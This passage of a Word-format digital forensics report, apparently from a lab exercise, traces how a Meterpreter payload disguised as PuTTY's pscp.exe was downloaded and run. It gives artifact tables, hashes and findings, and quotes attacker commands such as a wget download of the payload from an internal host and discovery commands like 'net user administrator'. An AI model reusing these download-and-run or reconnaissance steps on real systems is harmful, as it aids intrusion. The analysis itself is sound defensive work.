              <w:t>2023-11-10 11:11:23.838148</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>TASKLIST.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=2448BC7D False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#193</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\TASKLIST.EXE-2448BC7D.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:10:55.603703</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI creation (B) ; $FN modification (M) ; $FN access (A) ; $FN MFT change (C)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\1.exe</w:t>
              <w:br/>
              <w:t>size=986624</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#119927</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 Program execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>I checked program execution in Prefetch (231 files), Amcache files and programs, ShimCache, BAM, UserAssist, MUICache, PCA, SRUM (app timeline, resource use, network usage), Sysmon EID 1/3/8, PowerShell 4103/4104/800 and the PSReadLine history.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Malicious executable**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- C:\Payloads\pscp.exe ran at 2023-11-10 11:03:09 UTC. Its parent was medmondson's elevated PowerShell (PID 1088, GUID {e6e9f951-0de1-654e-8801-000000000500}), which the user's own explorer shell (GUID …0907-654e-5c00…) had started at 11:02:57.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Four independent sources show the run: Sysmon 1, Prefetch (PSCP.EXE-1DCA12FC, run count 1), SRUM (about 120 s duration, ending 11:17) and PowerShell 4104 plus PSReadLine (`.\pscp.exe`).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- ShimCache and $MFT show the file is present; its Zone.Identifier (ZoneId=3) points to http://10.0.0.12:8080/pscp.exe.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- There is no Amcache or BAM entry for it.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Hashes: MD5 DED9E58DD95A88A4BEE89B74A65F05F1, SHA256 ABBF7B5F7A059348A17DCD8BCD464767125F54B4F8691F0F810AC1819C6CF931, IMPHASH ADD361A4F3939AF38D11873F1D74BDED.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- It masquerades as PuTTY PSCP: version info reads "PuTTY suite", OriginalFileName "PSCP", "Release 0.79".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**New discovery commands (F-007)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- These come from cmd 5848, a child of the injected explorer.exe PID 7324: `netstat -ntb` at 11:12:23, `whoami /user` at 11:13:25, and `net user administrator` (which ran net1) at 11:13:35.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Sysmon 1 and Prefetch both record them, each with run count 1.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Payload copies with no sign of execution (F-009)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- C:\Payloads\test.exe was saved with `wget …/pscp.exe -o test.exe` at 10:21:41. C:\Users\medmondson\1.exe was downloaded at 11:10:55.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Both are 986,624 bytes, the same size as pscp.exe. No artifact shows either one ran.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Recorded so far**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Findings F-007, F-008 (execution origin and corroboration, critical/confirmed) and F-009.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Timeline events T-008 to T-010 and IOCs I-007 to I-010.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Answers to Q1, Q2, Q3, Q5, Q6, Q7 and Q8. Q6 gives the full ProcessGuid chain.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- A note listing the lab and analyst noise that was excluded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-008: Execution provenance of C:\Payloads\pscp.exe: launched by the user's elevated PowerShell (PID 1088), corroborated by Prefetch, SRUM, ShimCache, PSReadLine and 4104</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artifact:powershell history (psreadline)</w:t>
              <w:br/>
              <w:t>artifact:prefetch</w:t>
              <w:br/>
              <w:t>artifact:shimcache (appcompatcache)</w:t>
              <w:br/>
              <w:t>artifact:srum (application resources)</w:t>
              <w:br/>
              <w:t>artifact:srum (application timeline)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-powershell%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</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T1204.002, T1036.005, T1055, T1059.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53 → 2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Sysmon 1 2023-11-10 11:02:57.768: powershell.exe (no args) GUID {e6e9f951-0de1-654e-8801-000000000500} PID 1088, parent C:\Windows\explorer.exe GUID {e6e9f951-0907-654e-5c00-000000000500} (legitimate user shell) (row 18642).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- PowerShell 4104 2023-11-10 11:03:09.878 ScriptBlockText ".\pscp.exe" (row 8742); 4103 at 11:03:04 shows directory listing containing pscp.exe and test.exe (row 8737).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Sysmon 1 2023-11-10 11:03:09.903: "C:\Payloads\pscp.exe" PID 2196 GUID {e6e9f951-0ded-654e-8f01-000000000500}, ParentProcessGuid {e6e9f951-0de1-654e-8801-000000000500} (PID 1088), User medmondson, IL High, CurrentDirectory C:\Payloads\, MD5 DED9E58DD95A88A4BEE89B74A65F05F1, SHA256 ABBF7B5F7A059348A17DCD8BCD464767125F54B4F8691F0F810AC1819C6CF931, IMPHASH ADD361A4F3939AF38D11873F1D74BDED, version info Product "PuTTY suite", OriginalFileName "PSCP", FileVersion "Release 0.79" (row 18650).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Sysmon 1 11:03:09.990: child "explorer.exe" PID 7324 GUID {e6e9f951-0ded-654e-9001-000000000500} (genuine C:\Windows\explorer.exe, SHA256 CEF64201…2D9C09A5... MD5 9FBBF189473A313776019D2EAA72A47A) (row 18651).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Prefetch PSCP.EXE-1DCA12FC.pf: RunCount 1, LastRun 11:03:09.900, directories \PAYLOADS (prefetch row 98); EXPLORER.EXE-03C49D11 RunCount 1 LastRun 11:03:09.979 (row 37).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- PSReadLine ConsoleHost_history (medmondson): "wget http://10.0.0.12:8080/pscp.exe -o test.exe" (order 3), ".\pscp.exe" (order 17).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- SRUM AppTimeline: pscp.exe user medmondson, EndTime 11:17:00, DurationMs 119993; AppResourceUseInfo \Device\HarddiskVolume4\Payloads\pscp.exe ForegroundCycleTime 187,674,331 (11:43 interval).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ShimCache: C:\Payloads\pscp.exe and C:\Users\medmondson\Downloads\pscp.exe, LastModified 2023-11-10 10:19:53.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- $MFT: C:\Payloads\pscp.exe entry 85781, 986,624 bytes, $SI created 10:20:10.117, modified 10:19:53.851, ADS Zone.Identifier ZoneId=3 HostUrl=http://10.0.0.12:8080/pscp.exe ReferrerUrl=http://10.0.0.12:8080/.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Amcache: no entry for pscp.exe (no InventoryApplicationFile record); BAM: no entry.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Execution of the malicious executable is established by four independent sources (Sysmon 1, Prefetch, SRUM, PowerShell 4104/PSReadLine). It was started interactively from an elevated PowerShell console of medmondson (the lab operator detonating the payload after excluding C:\Payloads\ from Defender), so it ran with High integrity, which explains the subsequent ability to inject into lsass (F-005). The binary carries PuTTY PSCP 0.79 version resources (masquerade) while Defender classified it Trojan:Win64/Meterpreter.E. Mark-of-the-Web proves origin from 10.0.0.12:8080; the file moved/copied from Downloads to C:\Payloads at 10:20:10. Absence in Amcache/BAM is not significant (Amcache inventory is not exhaustive; BAM records only some interactive launches). SRUM duration ~120 s suggests pscp.exe itself exited shortly after spawning/injecting explorer.exe 7324, which carried the session afterwards (interpretation).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Evidence (15)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11:02:57.767576</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t xml:space="preserve">"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" </w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 1088, ProcessGUID: e6e9f951-0de1-654e-8801-000000000500 | RuleName: - | MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481 | ParentProcess: C:\Windows\ex</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18642</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.877971</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.\pscp.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#8742</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:04.599586</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-PowerShell/Operational 4103 | Microsoft-Windows-PowerShell | Pipeline executed | Command Name:  | Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Script Name:  | ConnectedUser:  | Host Name: ConsoleHost | Payload: CommandInvocation(Out-Default): "Out-Default", ParameterBinding(Out-Default): name="Inp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#8737</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-PowerShell%4Operational.evtx</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11:03:09.989870</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>explorer.exe</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Sysmon/Operational 1 | Microsoft-Windows-Sysmon | Process creation | ProcessID: 7324, ProcessGUID: e6e9f951-0ded-654e-9001-000000000500 | RuleName: - | MD5=9FBBF189473A313776019D2EAA72A47A,SHA256=CEF64201A97E08834F5C8952907A1719531A7D99B53309CB2E2956F40CFF3486,IMPHASH=D505016A935B17367AA0263582F3F1E2 | ParentProcess: C:\Payloads\p</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#18651</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-Sysmon%4Operational.evtx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r>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:03:09.978687</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>EXPLORER.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=3C49D11 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#37</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\prefetch\EXPLORER.EXE-03C49D11.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:36:48.063750</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PowerShell history (PSReadLine)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: mtime</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\AppData\Roaming\Microsoft\Windows\PowerShell\psreadline\ConsoleHost_history.txt</w:t>
              <w:br/>
              <w:t>command=wget http://10.0.0.12:8080/pscp.exe -o test.exe | order=3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/powershell_history.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Roaming\Microsoft\Windows\PowerShell\psreadline\ConsoleHost_history.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:36:48.063750</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>PowerShell history (PSReadLine)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>history: mtime</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\AppData\Roaming\Microsoft\Windows\PowerShell\psreadline\ConsoleHost_history.txt</w:t>
              <w:br/>
              <w:t>command=.\pscp.exe | order=17</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/powershell_history.jsonl#19</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Users\medmondson\AppData\Roaming\Microsoft\Windows\PowerShell\psreadline\ConsoleHost_history.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:17:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM (application timeline)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SRUM: end of application activity</w:t>
              <w:br/>
              <w:t>pscp.exe</w:t>
              <w:br/>
              <w:t>duration_ms=119993</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_AppTimelineProvider_Output.csv#949</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
